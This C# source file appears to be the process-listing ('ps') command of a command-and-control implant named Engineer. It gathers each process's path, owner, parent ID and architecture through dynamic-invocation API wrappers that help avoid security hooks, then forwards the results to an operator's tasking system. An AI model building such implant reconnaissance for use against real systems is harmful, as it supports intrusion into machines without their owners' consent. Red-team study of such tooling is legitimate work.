using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Security.Principal;
using System.Threading.Tasks;
using DynamicEngLoading;

namespace Engineer.Commands
{
    internal class Ps : EngineerCommand
    {
        public override string Name => "ps";

        public override async Task Execute(EngineerTask task)
        {
            try
            {

                var results = new List<ProcessItem>();
                var processes = Process.GetProcesses();

                foreach (var process in processes)
                {
                    var result = new ProcessItem
                    {
                        ProcessName = process.ProcessName,
                        ProcessId = process.Id,
                        SessionId = process.SessionId
                    };

                    result.ProcessPath = GetProcessPath(process);
                    result.Owner = GetProcessOwner(process);
                    result.ProcessParentId = GetProcessParent(process);
                    result.Arch = GetProcessArch(process);

                    results.Add(result);
                }

                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults(results, task, EngTaskStatus.Complete,TaskResponseType.ProcessItem);
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
                Console.WriteLine(e.StackTrace);
                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults(e.Message, task, EngTaskStatus.Failed,TaskResponseType.String);
            }
        }
        
        private string GetProcessPath(Process process)
        {
            try
            {
               //Console.WriteLine("Getting Process path");
                return process.MainModule.FileName;
            }
            catch
            {
                return "-";
            }
        }
        
        private static int GetProcessParent(Process process)
        {
            try
            {
               // Console.WriteLine("Getting Process Parent");
                var pbi = h_DynInv_Methods.NtFuncWrapper.NtQueryInformationProcessBasicInformation(process.Handle);
                return pbi.InheritedFromUniqueProcessId;
            }
            catch
            {
                return 0;
            }
        }

        private string GetProcessOwner(Process process)
        {
            var hToken = IntPtr.Zero;

            try
            {
               // Console.WriteLine("Getting Process Owner");
                if (!h_DynInv_Methods.AdvApi32FuncWrapper.OpenProcessToken(process.Handle, h_DynInv.Win32.Advapi32.TOKEN_READ, out hToken))
                    return "-";

                var identity = new WindowsIdentity(hToken);
                h_DynInv_Methods.Ker32FuncWrapper.CloseHandle(hToken);
                return identity.Name;
            }
            catch
            {
                return "-";
            }
            finally
            {
                h_DynInv_Methods.Ker32FuncWrapper.CloseHandle(hToken);
            }
        }

        private string GetProcessArch(Process process)
        {
            try
            {
                var is64BitOS = Environment.Is64BitOperatingSystem;

                if (!is64BitOS)
                    return "x86";
                //Console.WriteLine("Getting Process Arch");
                if (!h_DynInv_Methods.Ker32FuncWrapper.IsWow64Process(process.Handle, out var isWow64))
                    return "-";

                if (is64BitOS && isWow64)
                    return "x86";

                return "x64";
            }
            catch
            {
                return "-";
            }
        }
    }

    
}

